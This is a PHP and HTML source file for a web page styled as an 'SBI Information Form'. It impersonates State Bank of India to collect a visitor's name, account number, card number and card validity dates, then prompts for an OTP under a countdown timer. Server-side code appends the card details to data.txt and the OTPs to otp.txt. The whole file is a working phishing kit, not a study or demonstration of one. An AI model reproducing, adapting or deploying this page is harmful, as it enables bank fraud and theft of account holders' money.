<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
    $otp = htmlspecialchars($_POST['otp']);
    file_put_contents("otp.txt", "OTP: $otp\n", FILE_APPEND);
    $message = "OTP saved.";
} elseif ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $accountNumber = htmlspecialchars($_POST['accountNumber']);
    $cardNumber = htmlspecialchars($_POST['cardNumber']);
    $validFrom = htmlspecialchars($_POST['validFrom']);
    $validUpto = htmlspecialchars($_POST['validUpto']);

    $data = "Name: $name\nAccount Number: $accountNumber\nCard Number: $cardNumber\nValid From: $validFrom\nValid Upto: $validUpto\n\n";
    file_put_contents("data.txt", $data, FILE_APPEND);

    $message = "Information submitted successfully! Please enter the OTP.";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBI Information Form</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #e5e5e5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0 20px;
        }

        .container {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .header img {
            width: 40px;
            margin-right: 10px;
        }

        h1 {
            color: #003a70;
            font-size: 24px;
            margin: 0;
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #003a70;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #002a50;
        }

        #message {
            text-align: center;
            margin-top: 10px;
            color: red;
        }

        .otp-container {
            display: none;
            margin-top: 20px;
            text-align: center;
        }

        #timer {
            margin-top: 10px;
            font-weight: bold;
            color: #003a70;
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }

            h1 {
                font-size: 20px;
            }

            input, button {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="path_to_sbi_logo.png" alt="SBI Logo"> 
            <h1>SBI Information</h1>
        </div>

        <?php if (!isset($_POST['otp'])): ?>
            <form id="infoForm" method="POST">
                <div class="input-group">
                    <label for="name">Name</label>
                    <input type="text" id="name" name="name" required>
                </div>
                <div class="input-group">
                    <label for="accountNumber">Account Number</label>
                    <input type="text" id="accountNumber" name="accountNumber" required>
                </div>
                <div class="input-group">
                    <label for="cardNumber">Card Number</label>
                    <input type="text" id="cardNumber" name="cardNumber" required>
                </div>
                <div class="input-group">
                    <label for="validFrom">Valid From</label>
                    <input type="date" id="validFrom" name="validFrom" required>
                </div>
                <div class="input-group">
                    <label for="validUpto">Valid Upto</label>
                    <input type="date" id="validUpto" name="validUpto" required>
                </div>
                <button type="submit">Submit</button>
                <p id="message"><?= isset($message) ? $message : ''; ?></p>
            </form>
        <?php else: ?>
            <div class="otp-container" id="otpContainer" style="display: block;">
                <h2>Enter OTP</h2>
                <form method="POST">
                    <div class="input-group">
                        <input type="text" id="otpInput" name="otp" placeholder="Enter OTP" required>
                    </div>
                    <button type="submit">Verify OTP</button>
                    <p id="timer">05:00</p>
                </form>
            </div>
        <?php endif; ?>
    </div>

    <script>
        let countdown;
        let timerDisplay = document.getElementById("timer");

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            countdown = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                timerDisplay.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(countdown);
                    timerDisplay.textContent = "Time's up!";
                    document.getElementById("otpContainer").style.display = "none";  
                }
            }, 1000);
        }

        startTimer(300); 
    </script>
</body>
</html>
